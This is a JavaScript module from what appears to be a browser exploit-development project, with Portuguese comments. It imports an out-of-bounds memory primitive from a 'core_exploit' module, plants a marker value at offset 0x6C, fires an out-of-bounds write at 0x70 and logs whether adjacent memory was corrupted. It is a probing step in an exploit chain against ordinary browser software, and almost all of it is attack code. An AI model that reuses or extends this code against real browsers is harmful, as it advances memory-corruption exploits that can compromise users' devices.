// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
// import { JSC_OFFSETS } from '../config.mjs'; // Não estamos focando em offsets de estrutura JS neste teste

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_INVESTIGATE_0x6C = "investigate0x70EffectOn0x6C_v11a";

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const TARGET_OBSERVATION_OFFSET_0x6C = 0x6C; // O offset que estamos observando
const PLANTED_VALUE_FOR_0x6C = new AdvancedInt64(0x42424242, 0x41414141); // AAAA_BBBB

// ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
// sprayedVictimObjects não é usado neste teste específico, mas pode ser reintroduzido depois.

export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome da exportação por consistência
    logS3(`--- Iniciando ${FNAME_INVESTIGATE_0x6C}: Investigar Efeito de 0x70 em 0x6C ---`, "test", FNAME_INVESTIGATE_0x6C);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_INVESTIGATE_0x6C);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_INVESTIGATE_0x6C);

        // FASE 1: Plantar valor conhecido em 0x6C
        logS3(`FASE 1: Plantando ${PLANTED_VALUE_FOR_0x6C.toString(true)} em oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}]...`, "info", FNAME_INVESTIGATE_0x6C);
        oob_write_absolute(TARGET_OBSERVATION_OFFSET_0x6C, PLANTED_VALUE_FOR_0x6C, 8);

        const value_at_0x6C_before_trigger = oob_read_absolute(TARGET_OBSERVATION_OFFSET_0x6C, 8);
        logS3(`  Valor em oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}] ANTES do trigger: ${isAdvancedInt64Object(value_at_0x6C_before_trigger) ? value_at_0x6C_before_trigger.toString(true) : toHex(value_at_0x6C_before_trigger)}`, "info", FNAME_INVESTIGATE_0x6C);

        if (!isAdvancedInt64Object(value_at_0x6C_before_trigger) || !value_at_0x6C_before_trigger.equals(PLANTED_VALUE_FOR_0x6C)) {
            logS3("  ALERTA: Valor plantado em 0x6C não foi lido corretamente!", "warn", FNAME_INVESTIGATE_0x6C);
        }
        await PAUSE_S3(50);

        // FASE 2: Acionar a escrita OOB em 0x70
        logS3(`FASE 2: Realizando escrita OOB em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_INVESTIGATE_0x6C);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger em 0x70 realizada.", "good", FNAME_INVESTIGATE_0x6C);
        await PAUSE_S3(100); 

        // FASE 3: Observar o valor em 0x6C APÓS a escrita em 0x70
        logS3(`FASE 3: Lendo valor de oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}] APÓS trigger em 0x70...`, "info", FNAME_INVESTIGATE_0x6C);
        const value_at_0x6C_after_trigger = oob_read_absolute(TARGET_OBSERVATION_OFFSET_0x6C, 8);
        
        let after_trigger_str = isAdvancedInt64Object(value_at_0x6C_after_trigger) ? value_at_0x6C_after_trigger.toString(true) : toHex(value_at_0x6C_after_trigger);
        logS3(`  Valor em oob_buffer[${toHex(TARGET_OBSERVATION_OFFSET_0x6C)}] APÓS trigger: ${after_trigger_str}`, "leak", FNAME_INVESTIGATE_0x6C);

        if (isAdvancedInt64Object(value_at_0x6C_after_trigger)) {
            if (value_at_0x6C_after_trigger.equals(PLANTED_VALUE_FOR_0x6C)) {
                logS3("    Interpretação: O valor em 0x6C NÃO foi alterado pela escrita em 0x70.", "info", FNAME_INVESTIGATE_0x6C);
                document.title = "0x6C INALTERADO";
            } else if (value_at_0x6C_after_trigger.equals(CORRUPTION_VALUE_TRIGGER)) {
                logS3("    Interpretação: O valor em 0x6C foi SOBRESCRITO pelo valor de trigger de 0x70!", "vuln", FNAME_INVESTIGATE_0x6C);
                document.title = "0x6C IGUAL A 0x70!";
            } else {
                logS3("    Interpretação: O valor em 0x6C FOI ALTERADO para um novo valor.", "vuln", FNAME_INVESTIGATE_0x6C);
                document.title = "0x6C ALTERADO!";
            }
        } else {
             logS3("    ALERTA: Não foi possível ler um AdvancedInt64 de 0x6C após o trigger.", "warn", FNAME_INVESTIGATE_0x6C);
             document.title = "0x6C ERRO LEITURA";
        }

        // FASE 4: Verificar se o valor em 0x70 ainda é o CORRUPTION_VALUE_TRIGGER
        const value_at_0x70_after_trigger = oob_read_absolute(CORRUPTION_OFFSET_TRIGGER, 8);
        logS3(`  Valor em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] (local do trigger) APÓS tudo: ${isAdvancedInt64Object(value_at_0x70_after_trigger) ? value_at_0x70_after_trigger.toString(true) : toHex(value_at_0x70_after_trigger)}`, "info", FNAME_INVESTIGATE_0x6C);


        logS3("INVESTIGAÇÃO DO EFEITO EM 0x6C CONCLUÍDA.", "test", FNAME_INVESTIGATE_0x6C);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_INVESTIGATE_0x6C}: ${e.message}`, "critical", FNAME_INVESTIGATE_0x6C);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_INVESTIGATE_0x6C);
        document.title = `${FNAME_INVESTIGATE_0x6C} FALHOU!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_INVESTIGATE_0x6C} Concluído ---`, "test", FNAME_INVESTIGATE_0x6C);
    }
}
